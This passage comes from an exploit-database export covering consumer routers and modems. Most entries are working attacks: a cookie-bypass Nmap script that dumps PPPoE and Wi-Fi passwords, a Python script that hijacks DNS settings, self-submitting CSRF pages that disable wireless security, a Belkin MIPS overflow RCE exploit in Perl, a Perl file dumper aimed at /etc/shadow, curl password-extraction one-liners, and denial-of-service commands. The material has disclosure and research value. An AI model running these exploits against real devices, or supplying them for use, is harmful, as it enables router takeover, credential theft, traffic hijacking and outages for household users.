application console. Though the application
asks for password, it has poor cookie management which allows a user to
login even without providing the password.
Application uses cookie value ""admin"" to access the private pages which
reveals configuration details such as
PPoE username, PPoE password, wireless authentication key, details of MAC
addresses etc, in the source code.
Exploit Code [written in Nmap Script]
local nmap = require ""nmap""
local shortport = require ""shortport""
local table = require ""table""
local http = require ""http""
local stdnse = require 'stdnse'
description = [[
Tenda W309R allows an attacker to access the configuration detailed with no
authentication.
Firmware Tested : V5.07.46
Thanks & Credits : Mahesh Gavkar, Samandeep Singh (@samanLEET), Amit
Ghadigaonkar
--@usage
-- nmap host --script http-tenda --script-args user=tenda
--80/tcp open  http
--| http-tenda:
--|   PPPoE Username : home_user
--|   PPPoE Password : 12345
--|   Wireless Password : 12345678
--|   Clone MAC : AA:AA:AA:AA:AA:AA
--|_  Face MAC : BB:BB:BB:BB:BB:BB
author = ""Sanoop Thomas a.k.a @s4n7h0""
license = ""Same as Nmap--See http://nmap.org/book/man-legal.html""
categories = {""safe"",""discovery""}
portrule = shortport.http
function formatme(line)
local start = string.find(line, '""')
local stop = string.find(line, '"";')
return line:sub(start+1,stop-1)
end
function fetchinfo(r)
local tenda = {}
local param,value
for line in r.body:gmatch(""[^\r\n]+"") do
if(line:match(""def_PUN = ""))then
table.insert(tenda,""PPPoE Username : "" .. formatme(line))
end
if(line:match(""def_PPW =""))then
table.insert(tenda,""PPPoE Password : "" .. formatme(line))
end
if(line:match(""def_wirelesspassword =""))then
table.insert(tenda,""Wireless Password : "" .. formatme(line))
end
if(line:match(""var cln_MAC =""))then
table.insert(tenda,""Clone MAC : "" .. formatme(line))
end
if(line:match(""var fac_MAC = ""))then
table.insert(tenda,""Face MAC : "" .. formatme(line))
end
end
return tenda
end
action = function(host, port)
local user = ""admin""
local r
local config = {}
if(nmap.registry.args.user) then
user = nmap.registry.args.user
end
local header = {
cookies = user
r = http.get(host,port,'/index.asp',header)
return stdnse.format_output(true, fetchinfo(r))
end
PoC Output
root@bt# nmap 192.168.0.1 -p 80 --script http-tenda-enum
Starting Nmap 6.40 ( http://nmap.org ) at 2013-09-28 17:35
Nmap scan report for 192.168.0.1
Host is up (0.0019s latency).
PORT   STATE SERVICE
80/tcp open  http
| http-tenda-enum:
|   PPPoE Username : home_user
|   PPPoE Password : 12345
|   Wireless Password : 12345678
|   Clone MAC : AA:AA:AA:AA:AA:AA
|_  Face MAC : C8:3A:35:BB:BB:BB
MAC Address: C8:3A:35:BB:BB:BB (Tenda Technology Co.)
Nmap done: 1 IP address (1 host up) scanned in 2.30 seconds
SANTHO
twitter : @s4n70 <https://twitter.com/s4n7h0>"
2013-09-22,Remote,Hardware,Javier Perez,FiberHome Modem Router HG-110,Authentication Bypass To Remote Change DNS Servers,"# Exploit Title: Directory Path Traversal FiberHome Modem Router HG-110 / Remote Change DNS Servers
# Date: 22/09/2013
# Exploit Author: Javier Perez - javier@thecenutrios.com - @the_s41nt
# Vendor Homepage: http://hk.fiberhomegroup.com/
# Version: HG110_BH_V1.6
# PoC: Remote Change DNS Servers
# Example file ""shadow"": http://<public_ip>:8000/cgi-bin/webproc?getpage=../../../../../../../../../../../../etc/shadow&var:menu=advanced&var:page=dns","import urllib
import urllib2
ip = raw_input (""Enter Public IP: "")
dns1 = raw_input (""Enter DNS1: "")
dns2 = raw_input (""Enter DNS2: "")
url = 'http://'+ip+':8000/cgi-bin/webproc?getpage=html/index.html&var:menu=setup&var:page=lan'
user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
modificar = '%3AInternetGatewayDevice.LANDevice.1.X_TWSZ-COM_ProxyArp=0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DomainName=bamovistarwifi&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.1.Enable=1&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.2.Enable=1&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.1.IPInterfaceIPAddress=192.168.1.1&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.1.IPInterfaceSubnetMask=255.255.255.0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.2.IPInterfaceIPAddress=10.167.64.81&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPInterface.2.IPInterfaceSubnetMask=255.255.255.248&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DHCPServerEnable=1&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.MinAddress=192.168.1.33&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.MaxAddress=192.168.1.50&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DHCPLeaseTime=28800&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DHCPRelay=0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.SubnetMask=255.255.255.0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.IPRouters=192.168.1.1&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.1.X_TWSZ-COM_DHCPEnabled=1&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.2.X_TWSZ-COM_DHCPEnabled=1&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.3.X_TWSZ-COM_DHCPEnabled=1&%3AInternetGatewayDevice.LANDevice.1.WLANConfiguration.4.X_TWSZ-COM_DHCPEnabled=1&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.X_TWSZ-COM_UseIPRoutersAsDNSServer=0&%3AInternetGatewayDevice.LANDevice.1.LANHostConfigManagement.DNSServers='+dns1+'%2C'+dns2+'&errorpage=html%2Findex.html&getpage=html%2Findex.html&var%3Amenu=setup&var%3Apage=lan&obj-action=set&var%3Aerrorpage=lan&%3AInternetGatewayDevice.LANDevice.1.LANEthernetInterfaceConfig.1.DhcpServerEnable=1&%3AInternetGatewayDevice.LANDevice.1.LANEthernetInterfaceConfig.2.DhcpServerEnable=1&%3AInternetGatewayDevice.LANDevice.1.LANEthernetInterfaceConfig.3.DhcpServerEnable=1&%3AInternetGatewayDevice.LANDevice.1.LANEthernetInterfaceConfig.4.DhcpServerEnable=1'
headers = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11' }
req = urllib2.Request(url, modificar, headers)
response = urllib2.urlopen(req)
url = 'http://'+ip+':8000/cgi-bin/webproc?getpage=html/index.html&var:menu=maintenance&var:page=system'
user_agent = 'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'
modificar = 'reboot=Reboot&obj-action=reboot&var%3Anoredirect=1&var%3Amenu=maintenance&var%3Apage=system&var%3Aerrorpage=system&getpage=html%2Fpage%2Frestarting.html'
headers = { 'User-Agent' : 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11' }
req = urllib2.Request(url, modificar, headers)
response = urllib2.urlopen(req)
the_page = response.read()"
2006-07-27,WebApps,Hardware,jose.palanco,ZYXEL Prestige 660H-61 ADSL Router,Cross-Site Scripting,"source: https://www.securityfocus.com/bid/19180/info
http://www.example.com/Forms/rpSysAdmin?a=%3Cscript%3Ealert(&#039;www.eazel.es&#039;)%3C/script%3E","The Zyxel Prestige 660H-61 ADSL Router is prone to a cross-site scripting vulnerability because it fails to properly sanitize user-supplied input.
An attacker may leverage this issue to have arbitrary script code execute in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks."
2013-09-14,WebApps,Hardware,Matias Mingorance Svensson,Router ONO Hitron CDE-30364,Cross-Site Request Forgery,"# Exploit Title: Router ONO Hitron CDE-30364 - CSRF Vulnerability
# Date: 14-9-2013
# Exploit Author: Matias Mingorance Svensson - matias.ms[at]owasp.org
# Vendor Homepage:
http://www.ono.es/clientes/te-ayudamos/dudas/internet/equipos/hitron/hitron-cde-30364/
# Tested on: Hitron Technologies CDE-30364
# Version HW: 1A
# Version SW: 3.1.0.8-ONO
http://192.168.1.1/goform/Keyword?file=parent-website&dir=admin
http://192.168.1.1/goform/Firewall?dir=admin%2F&file=feat-
http://192.168.1.1/goform/Wls?dir=admin
https://www.owasp.org
http://es.linkedin.com/in/matiasms","Introduction:
Hitron Technologies CDE-30364 is a famous ONO Router using, also, a web
management interface in order to set and change device parameters.
The Hitron Technologies CDE-30364's web interface (listening on tcp/ip port
80) is prone to CSRF vulnerabilities which allows to change router
parameters and to perform many modifications to the router's parameters.
The default ip adress of this adsl router, used for management purpose, is
192.168.1.1.
Exploit-1: Enable/Disable Web Site Blocking and add new Key Word/URL
blocking(google in this case)
<html>
<body onload=""javascript:document.forms[0].submit()"">
<H2></H2>
<form method=""POST"" name=""form0"" action=""
%2F&checkboxName=on&blockingFlag=1&blockingAlertFlag=&cfKeyWord_Domain=&cfTrusted_MACAddress=&cfTrusted_MACAddress0=
0&cfTrusted_MACAddress1=0&cfTrusted_MACAddress2=0&cfTrusted_MACAddress3=0&cfTrusted_MACAddress4=0&cfTrusted_MACAddre
ss5=0&trustedMAC=&keyword0=google"">
</body>
</html>
Exploit-2: Enable/Disable Intrusion Detection System
<html>
<body onload=""javascript:document.forms[0].submit()"">
<H2></H2>
<form method=""POST"" name=""form0"" action=""
firewall&ids_mode=0&IntrusionDMode=on&rspToPing=1"">
</body>
</html>
Exploit-3: Disable(None) Wireless Security Mode
<html>
<body onload=""javascript:document.forms[0].submit()"">
<H2></H2>
<form method=""POST"" name=""form0"" action=""
%2F&file=wireless_e&key1=0000000000&key2=0000000000&key3=0000000000&key4=0000000000&k128_1=0000000000000000000000000
0&k128_2=00000000000000000000000000&k128_3=00000000000000000000000000&k128_4=00000000000000000000000000&ssid_list=0&
Encrypt_type=0"">
</body>
</html>
Many other changes can be performed.
Un saludo,
Mat�as Mingorance Svensson
*OWASP Foundation, Open Web Application Security Project*"
2006-07-17,DoS,Hardware,Barnaby Jack,D-Link Routers,UPNP Buffer Overflow,source: https://www.securityfocus.com/bid/19006/info,"D-Link wired and wireless routers are prone to a buffer-overflow vulnerability because these devices fail to properly bounds-check user-supplied input before copying it to an insufficiently sized memory buffer.
Successful exploits can allow remote attackers to execute arbitrary machine code in the context of the affected device.
Attackers can exploit this issue by sending a request of the form:
M-SEARCH <800 byte string> HTTP/1.0
to UDP port 1900."
2013-09-03,Remote,Hardware,kingcope,MikroTik RouterOS,sshd (ROSSSH) Remote Heap Corruption,"http://www.farlight.org/mikropackage.zip
https://gitlab.com/exploit-database/exploitdb-bin-sploits/-/raw/main/bin-sploits/28056.zip","During an audit the Mikrotik RouterOS sshd (ROSSSH) has been identified to have a remote previous to authentication heap corruption in its sshd component.
Exploitation of this vulnerability will allow full access to the router device.
This analysis describes the bug and includes a way to get developer access to recent versions of Mikrotik RouterOS
using the /etc/devel-login file. This is done by forging a modified NPK file using a correct signature and logging
into the device with username ‘devel’ and the password of the administrator. This will drop into a busybox shell for
further researching the sshd vulnerability using gdb and strace tools that have been compiled for the Mikrotik busybox
platform.
Shodanhq.com shows >290.000 entries for the ROSSSH search term.
The 50 megs Mikrotik package including the all research items can be downloaded here:"
2013-09-03,WebApps,Hardware,Kyle Lovett,Zoom Telephonics ADSL Modem/Router,Multiple Vulnerabilities,"http://<IP>/hag/pages/toc.htm (--Menu Banner)
http://<IP>/hag/pages/toolbox.htm (-Advanced Options Menu)
http://<IP>/hag/emweb/PopOutUserAdd.htm?id=70&user_id=""newintermediateaccount""&priv=v2&pass1=""123456""&pass2=""123456""&cmdSubmit=Save+Changes
http://<IP>/Action?id=76&cmdClear+Log=Clear+Log
http://www.osvdb.org/show/osvdb/95071
http://xforce.iss.net/xforce/xfdb/85612
http://www.idappcom.com/db/?7819
http://www.zoomtel.com/products/5715.html
http://www.zoomtel.com/graphics/datasheets/adsl/USB_3104_5510B.pdf
http://www.zoomtel.com/products/adsl_overview.html
http://www.zoomtel.com/products/5760.html
http://www.zoomtel.com/products/5751.html
http://www.zoomtel.com/products/5754.html","Five models of the Zoom Telephonics ADSL Modem/Router line suffer from
multiple critical vulnerabilities, almost all being of a remote access
attack vector.
Models affected:
Zoom X3 ADSL Modem/Router
Zoom X4 ADSL Modem/Router
Zoom X5 ADSL Modem/Router
Zoom ADSL Bridge Modem Model 5715 (1 vulnerability)
Zoom USB ADSL Modem Model 5510B (1 vulnerability)
Timeline:
The vendor has not responded to our inquires concerning these
vulnerabilities. They were first reported on June 28th, 2013 and
partial disclosure was made on July 9, 2013.
Directory Traversal/Unauthenticated access to administrative panels
CVSS Base Score 9.7
Impact Subscore 9.5
Temporal Score: 8.3
(AV:N/AC:L/Au:N/C:P/I:C/A:C/E:F/RL:W/RC:UR/CDP:H/TD:H/CR:ND/IR:ND/AR:ND)
CWE-22: Improper Limitation of a Pathname to a Restricted Directory
CVE-2013-5622 - Zoom X3 ADSL Modem Firmware 1.0.X 1.1.X 2.0.X 2.1.X
2.2.X 2.5.X 3.2
CVE-2013-5627 - Zoom X4 ADSL Modem Firmware 1.0.X 2.0.X 2.1.X 2.5.X 3.0.X
CVE-2013-5624 - Zoom X5 ADSL Modem Firmware 1.0.X 1.1.X 2.0.X 2.1.X
2.2.X 2.5.X 3.0.X
By simply placing the following two URLs into a web browser, a
vulnerability will all models and firmware versions allow for bypass
of administrative credential challenge. All models and firmware
versions can access these pages with no authentication. An
un-authenticated user can preform almost all administrative tasks once
the authentication is bypassed.
Improper handling of unexpected characters/data
CVSS Base Score 8.3
Impact Subscore 8.5
Temporal Score: 6.7
(AV:N/AC:M/Au:N/C:P/I:P/A:C/E:POC/RL:W/RC:UR)
CWE-241: Improper Handling of Unexpected Data Type
CVE-2013-5623 - Zoom X3 ADSL Modem Firmware 1.0.X 1.1.X 2.0.X 2.1.X
2.2.X 2.5.X 3.2
CVE-2013-5628 - Zoom X4 ADSL Modem Firmware 1.0.X 2.0.X 2.1.X 2.5.X 3.0.X
CVE-2013-5631 - Zoom X5 ADSL Modem Firmware 1.0.X 1.1.X 2.0.X 2.1.X
2.2.X 2.5.X 3.0.X
CVE-2013-5632 - Zoom ADSL Bridge Modem Model 5715; all firmware versions
CVE-2013-5633 - Zoom USB ADSL Modem Model 5510B; all firmware versions
When an unexpected/illegal character is added to the end of any URL
which calls a value, such as http://<IP>/MainPage?id=25' the browser
will immediately redirect the browser to the ""System Status"" page
without authentication, where links to each interface (i.e.
eth-0,usb-0,etc) is both selectable whose properties can be edited.
Plain text storage of ISP/PPPoe usernames/passwords
CVSS Base Score 6.8
Impact Subscore 6.4
Temporal Score: 8.6
(AV:N/AC:M/Au:N/C:P/I:P/A:P/E:POC/RL:W/RC:UR)
CWE-311: Missing Encryption of Sensitive Data
CVE-2013-5620 - Zoom X3 ADSL Modem Firmware 1.0.X 1.1.X 2.0.X 2.1.X
2.2.X 2.5.X 3.2
CVE-2013-5626 - Zoom X4 ADSL Modem Firmware 1.0.X 2.0.X 2.1.X 2.5.X 3.0.X
CVE-2013-5629 - Zoom X5 ADSL Modem Firmware 1.0.X 1.1.X 2.0.X 2.1.X
2.2.X 2.5.X 3.0.X
The following command will display the ISP usernames and passwords.
(The print value may vary slightly based on firmware.)
Proof of Concept
curl -s http://<IP>/MainPage?id=25 |egrep -i 'MacWanPasswd'|awk '{ print $8 }'
value=""wanpasswd1"" ('or similar')
curl -s http://<IP>/MainPage?id=25 |egrep -i 'MacWanUsrName'|awk '{ print $21 }'
value=""user@usersisp.net"" ('or similar')
Unauthenticated direct execution of administrative tasks
CVSS Base Score 10.0
Impact Subscore 10.0
Temporal Score: 8.6
(AV:N/AC:L/Au:N/C:C/I:C/A:C/E:F/RL:W/RC:UR/CDP:H/TD:H/CR:ND/IR:ND/AR:ND)
CWE-285: Improper Authorization
CVE-2013-5621 - Zoom X3 ADSL Modem Firmware 1.0.X 1.1.X 2.0.X 2.1.X 2.2.X 2.5.X
CVE-2013-5625 - Zoom X4 ADSL Modem Firmware 1.0.X 2.0.X 2.1.X 2.5.X
CVE-2013-5630 - Zoom X5 ADSL Modem Firmware 1.0.X 1.1.X 2.0.X 2.1.X 2.2.X 2.5.X
Administrative authentication can be bypassed and commands directly
executed with specially crafted commands.
Proofs of Concept -
Create New Acct Admin or Intermediate - (all PW and admin names are
'or similar')
Clear Logs
Fixes/Patches:
There are no known patches or fixes for these vulnerabilities at this time.
Workaround:
It is advised to turn off all remote administrative access to the
router. This workaround however, will not prevent local attacks.
External Links
Vendor Links
Discovered - 06-28-2013
Updated - 09/01/2013
Research Contact - K Lovett
Affiliation - QuattroSG"
2013-08-26,Remote,Hardware,Aodrulez,Belkin G Wireless Router Firmware 5.00.12,Remote Code Execution,"http://www.youtube.com/watch?v=MtrYs-f6X3E
#!/usr/bin/perl
# Variable declarations.
# Just a few nops followed by a dummy shellcode that crashes & reboots the router.
# Stage 1: Fill shellcode at a known location : 0x803c0278 (Buffer=120 bytes)
# 0x803c0278 is fixed for this device/firmware combination.
# Fill the rest with nops. Not needed but good to have.
# Shellcode size should be ideally a multiple of 4 as this is MIPS.
# Stage 2: Trigger Stack Overflow & overwrite RA
# Burn!!
# End of exploit code.","| Belkin G Wireless Router RCE PoC. |
Firmware Version : 5.00.12 (Sep 10 2009 19:54:12)
Boot Version     : 1.18
Hardware         : F5D7234-4 v5 (01)
Author           : Aodrulez.
Email            : atul.alex@orchidseven.com
Twitter          : http://twitter.com/Aodrulez
| Details |
The exploit works in 3 stages.
1. Authentication.
2. Setting up shellcode in the memory at a known location.
3. Triggering an RA register over-write to execute the shellcode.
This particular model of router is based on 'embedded Configurable operating system' a.k.a (eCos) version 2.0. The shellcode used in the exploit is a dummy one that basically just triggers an exception & crashes the router, forcing it to reboot.
Video Demo :
| Exploit |
use strict;
use warnings;
use LWP 5.64;
$| = 1;
my $browser = LWP::UserAgent->new;
my $passHash="""";
my $url ="""";
my $response ="""";
my $ip="""";
$browser ->timeout(10);
my $shellcode=""\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x04\xd0\xff\xff\x20\x20\x20\x20"";
sub Authenticate()
print ""[+] Trying to authenticate.\n"";
$url= ""http://$ip/login.stm"";
$response = $browser->get( $url);
my @aod= $response->content =~ m/var password = ""(.*)"";/g;
if(!$aod[0])
print ""[-] Damn! Something went wrong. This might not work here :-/\n"";
exit;
else
$passHash=$aod[0];
print ""[+] Admin Password = $passHash (MD5 Hash).\n"";
print ""[+] Time to authenticate you!\n"";
$url = ""http://$ip/cgi-bin/login.exe"";
$response = $browser->post( $url,
[ 'totalMSec' => ""1377121454.99"",
'pws' => ""$passHash"",
if( $response->content =~ /index/ )
print ""[+] Logged in successfully as 'Admin'!\n"";
print ""[!] Open this link in a browser for admin access : http://$ip/setup.htm \n"";
} else {
print ""[-] Login failed! This might not work here :-/\n"";
exit;
print ""\n[+] Continue with exploitation? (Y/N) : "";
my $temp=<STDIN>;
if ($temp=~""Y"" || $temp=~""y"")
Exploit();
else
print ""[+] Have fun!\n\n"";
exit;
sub Exploit()
print ""[+] Stage 1 : Allocating shellcode.\n"";
if (length($shellcode) > 120)
print ""[-] Shellcode is too big! (120 bytes Max)\n"";
exit;
print ""[+] Shellcode length : "".length($shellcode).""\n"";
my $nopsize=120-length($shellcode);
$shellcode=$shellcode.(""\x20""x$nopsize);
$url = ""http://$ip/cgi-bin/wireless_WPA.exe"";
$response = $browser->post( $url,
[ 'wpa_authen' => ""1"",
'wpa_psk' => '0',
's_rekeysec' => '900000',
's_rekeypkt' => '1000',
'w802_rekey' => '0',
'encryption' => '3',
'security_type' => '4',
'authentication' => '3',
'encryption_hid' => '3',
'wpa_key_text' => ""ssss"",
'wpa_key_pass' => ""$shellcode"",
'obscure_psk' => '1',
'sharedkey_alter' => '',
'sharedkey_alter1' => '1',
if( !$response->content )
print ""[-] Damn! Something went wrong. This might not work here :-/\n"";
else
print ""[+] Stage 1 seems to have gone well.\n"";
print ""[+] Stage 2 : Triggering Return Address overwrite.\n"";
my $junk=""A""x32;
my $s0=""BBBB"";
my $s1=""CCCC"";
my $ra=""\x78\x02\x3c\x80""; #EPC   -> 0x803c0278 Fixed for this device/firmware combination.
my $nop=""\x20\x20\x20\x20"";
my $payload=$junk.$s0.$s1.$ra.$nop;
$url = ""http://$ip/cgi-bin/wireless_WPS_Enroll.exe"";
$response = $browser->post( $url,[ 'pin' => ""$payload""]);
if( !$response->content )
print ""[-] Damn! Something went wrong. This might not work here :-/\n"";
else
print ""[-] Done! \\m/\n"";
sub Welcome()
print ""\n\n+------------------------------------------+\n"";
print ""|  Belkin G Wireless Router Remote Exploit |\n"";
print ""|     (Authentication bypass & RCE PoC)    |\n"";
print ""+------------------------------------------+\n"";
print ""[+] By Aodrulez.\n"";
print ""\n[+] Usage   : perl $0 router_ip"";
print ""\n[!] Example : perl $0 192.168.2.1"";
if (!$ARGV[0])
print ""\n[-] (o_0) Seriously??\n"";
exit;
$ip=$ARGV[0];
print ""\n[+] Target IP : $ip\n"";
Welcome();
Authenticate();
| Greetz Fly Out To |
1] Amforked()          : My Mentor.
2] The Blue Genius     : My Boss.
3] str0ke (milw0rm)
4] www.orchidseven.com
5] www.malcon.org
6] www.nsd.org.in
| Quote |
“I would rather die of passion than of boredom.” - Vincent van Gogh."
2013-08-02,WebApps,Hardware,Kyle Lovett,Western Digital My Net Wireless Routers,Password Disclosure,"http://www.wdc.com/en/products/network/routers/
http://support.wdc.com/download/notes/My_Net_N900C_FW_Release_Notes_1.07.16.pdf?v=9564
http://support.wdc.com/download/notes/My_Net_N900_FW_Release_Notes_1.07.16.pdf?v=7436
http://support.wdc.com/download/notes/My_Net_N750_FW_Release_Notes_1_04_16.pdf?v=6879
http://support.wdc.com/download/notes/My_Net_N600_FW_Release_Notes_1_04_16.pdf?v=4950","Vulnerable Systems:
Western Digital My Net Series Wireless Routers:
N600  Firmware 1.03.12
N600  Firmware 1.04.16
N750  Firmware 1.03.12
N750  Firmware 1.04.16
N900  Firmware 1.05.12
N900  Firmware 1.06.18
N900  Firmware 1.06.28
N900C Firmware 1.05.12
N900C Firmware 1.06.18
N900C Firmware 1.06.28
CVE 2013-5006
CWE-256 Plaintext Storage of a Password
CVSS Base Score    4.3
CVSS Impact Subscore     2.9
Cvss Expoit Score   8.6
(AV:N/AC:M/Au:N/C:P/I:N/A:N/E:POC/RL:U/RC:UR/CDP:H/TD:H/CR:H/IR:H/AR:H)
Proof of concept:
curl -s http://<IP>:8080/main_internet.php? | egrep -i 'var pass'
which will give an output similar to this ex:
var pass="""";
Details:
By sending a specially crafted command to the affected routers, the clear text password for the admin account can be extracted, with no authentication required to access the page where it is stored.
During the initial setup of these four routers with the affected firmware, the admin password is stored in clear text on the main_internet.php? source code page as the value for 'var pass'. For this bug to exploitable from a remote network attack, UPnP and remote administrative access (port 8080 is set by default) must be enabled.
The vendor has not responded to any inquiries concerning the bug.
External Sources:
OSVDB - http://www.osvdb.org/show/osvdb/95519
CVE-Mitre - http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-5006
IBM xforce - http://xforce.iss.net/xforce/xfdb/85903
Bugtraq/SecList - http://www.securityfocus.com/archive/1/527433
Security Database - http://www.security-database.com/detail.php?alert=CVE-2013-5006
Vendor's Network Router Product Pages:
Additional Notes/Fixes/Workarounds:
Firmware notes: N900 and N900C with firmware 1.07.16 released on 05/2013 fixes the bug. It is advised that users with the N900 or N900C upgrade to 1.07.16.  Earlier firmware releases of 1.02.02, 1.03.11 and 1.04.08 are unaffected.
N600 and N750 with the earlier firmware 1.01.04 and 1.01.20 are unaffected by this bug. Firmware 1.02.08 was not tested. The 'workaround' for these two model routers, which will only stop network side attacks, is for the end user to disable remote administrative access capabilities.
Discovered - 07-02-2013
Updated - 07-31-2013
Research Contact - K Lovett
Affiliation - SUSnet"
2005-12-14,DoS,Hardware,Justin M. Wray,Linksys Routers,LanD Packet Denial of Service,source: https://www.securityfocus.com/bid/15861/info,"Multiple Linksys devices are prone to a denial of service vulnerability.
These devices are susceptible to a remote denial of service vulnerability when handling TCP 'LanD' packets.
This issue allows remote attackers to crash affected devices, or to temporarily block further network routing functionality. This will deny further network services to legitimate users.
Linksys BEFW11S4 and WRT54GS devices are reportedly affected by this issue. Due to code reuse among devices, other devices may also be affected.
hping2 -A -S -P -U 1.2.3.4 -s 80 -p 80 -a 192.168.1.1"
2005-07-25,Remote,Hardware,d.is.evil,ECI Telecom B-FOCuS Router 312+,Unauthorized Access,"source: https://www.securityfocus.com/bid/14364/info
http://www.example.com/cgi-bin/firmwarecfg","B-FOCuS Router 312+ is affected by a vulnerability that can allow unauthorized attackers to gain access to an affected device.
An attacker can disclose the administrator password through the Web interface of the device.
This can lead to a complete compromise of the router."
2013-06-05,WebApps,Hardware,Todor Donev,Seowonintech Routers fw: 2.3.9,File Disclosure,"#!/usr/bin/perl
# [+] Seowonintech routers * <= fw: 2.3.9 remote root file dumper
# Author: Todor Donev (todor dot donev at gmail.com)
# Type: Hardware
# Platform: Linux
# Special greetz to Stiliyan Angelov, Tsvetelina Emirska and all
# my friends that support me
# 2013 Bulgaria","use LWP::Simple;
my $host  =  $ARGV[0] =~ /^http:\/\// ?  $ARGV[0]:  'http://' . $ARGV[0];
if(not defined $ARGV[0])
usg();
exit;
print ""[+] Seowonintech routers * <= fw: 2.3.9 remote root file dumper\n"";
$check = $host.""/cgi-bin/system_config.cgi"";
get($check) || die ""[-] Error: $!\n"";
if (defined $check =~ s/\/etc\///gs){
print ""[+] Connected to $ARGV[0]\n"";
print ""[+] Exploiting..\n\n"";
while(1){
print ""# cat "";
chomp($file=<STDIN>);
$bug = $host.""/cgi-bin/system_config.cgi?file_name="".$file.""&btn_type=load&action=APPLY"";
if($file eq """"){ print ""Enter full path to file!\n""; }
$data=get($bug) || die ""$!, try another exploit\n"";
$data =~ s/Null/File not found!/gs;
if (defined $data =~ m{rows=""30"">(.*?)</textarea>}sx){
print $1.""\n"";
sub usg
print "" [+] Seowonintech routers * <= fw: 2.3.9 remote root file dumper\n"";
print "" [?] usg: perl $0 <victim>\n"";
print "" [?] exmp xpl usg: perl $0 192.168.1.1 :)\n"";
print "" [?] exmp xpl cmd: # cat /etc/shadow :)\n"";
print "" [?] The device use Linux.\n"";"
2005-05-19,Remote,Hardware,Francesco Orro,D-Link DSL Router,Remote Authentication Bypass,source: https://www.securityfocus.com/bid/13679/info,"Various D-Link DSL routers are susceptible to a remote authentication bypass vulnerability. This issue is due to a failure of the devices to require authentication in certain circumstances.
This vulnerability allows remote attackers to gain complete administrative access to affected devices.
Various D-Link devices with the following firmware revisions are affected by this issue:
- V1.00B01T16.EN.20040211
- V1.00B01T16.EU.20040217
- V0.00B01T04.UK.20040220
- V1.00B01T16.EN.20040226
- V1.00B02T02.EU.20040610
- V1.00B02T02.UK.20040618
- V1.00B02T02.EU.20040729
- V1.00B02T02.DE.20040813
- V1.00B02T02.RU.20041014
Due to the common practice of code reuse, other devices are also likely affected by this issue.
<html><head>Download config.xml:<title>GetConfig - Config file
download</title></head><body>
<script lang=""javascript"">
function invia_richiesta()
document.DownloadConfig.action='http://'+document.InputBox.Host.value+'/cgi-bin/firmwarecfg';
document.DownloadConfig.submit();
</script>
<form name=""InputBox"">
<br>http://<input Name=""Host"" type=""text"" value="""">/cgi-bin/firmwarecfg<br>
</form>
<form name=""DownloadConfig"" method=""POST"" action=""""
enctype=""multipart/form-data"">
<input type=""Submit"" name=""config"" value=""Download""
onClick=""javascript:invia_richiesta();""><br>
</form></body></html>"
2005-03-25,DoS,Hardware,Chris Rock,Netcomm NB1300 Modem/Router,Remote Denial of Service,source: https://www.securityfocus.com/bid/12901/info,"Netcomm NB1300 Modem/Router is reported prone to a remote denial of service vulnerability.
An attacker can exploit this condition by sending a large amount of ping requests to the device.
A successful attack can deny service to legitimate users.
Send four consecutive requests of
ping -l 65500 -w 0 -t <IP of DSL Modem>"
2013-03-22,DoS,Hardware,LiquidWorm,TP-Link TL-WR740N Wireless Router,Denial of Service,"# TP-Link TL-WR740N Wireless Router Remote Denial Of Service Exploit
# Vendor: TP-LINK Technologies Co., Ltd.
# Product web page: http://www.tp-link.us
# Affected version:
# - Firmware version: 3.16.4 Build 130205 Rel.63875n (Released: 2/5/2013)
# - Hardware version: WR740N v4 00000000 (v4.23)
# - Model No. TL-WR740N / TL-WR740ND
# Summary: The TL-WR740N is a combined wired/wireless network connection
# device integrated with internet-sharing router and 4-port switch. The
# wireless N Router is 802.11b&g compatible based on 802.11n technology
# and gives you 802.11n performance up to 150Mbps at an even more affordable
# price. Bordering on 11n and surpassing 11g speed enables high bandwidth
# consuming applications like video streaming to be more fluid.
# Desc: The TP-Link WR740N Wireless N Router network device is exposed to a
# remote denial of service vulnerability when processing a HTTP request. This
# issue occurs when the web server (httpd) fails to handle a HTTP GET request
# over a given default TCP port 80. Sending a sequence of three dots (...) to
# the router will crash its httpd service denying the legitimate users access
# to the admin control panel management interface. To bring back the http srv
# and the admin UI, a user must physically reboot the router.
# ============================== Playground: ==============================
# Shodan: WWW-Authenticate: Basic realm=""TP-LINK Wireless Lite N Router WR740N""
# # nmap -sV 192.168.0.1
# Starting Nmap 6.01 ( http://nmap.org ) at 2013-03-19 04:53 Central European Standard Time
# Nmap scan report for 192.168.0.1
# Host is up (0.00s latency).
# Not shown: 999 closed ports
# PORT   STATE SERVICE VERSION
# 80/tcp open  http    TP-LINK WR740N WAP http config
# MAC Address: AA:BB:CC:DD:EE:FF (Tp-link Technologies CO.)
# Service Info: Device: WAP
# Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
# Nmap done: 1 IP address (1 host up) scanned in 12.42 seconds
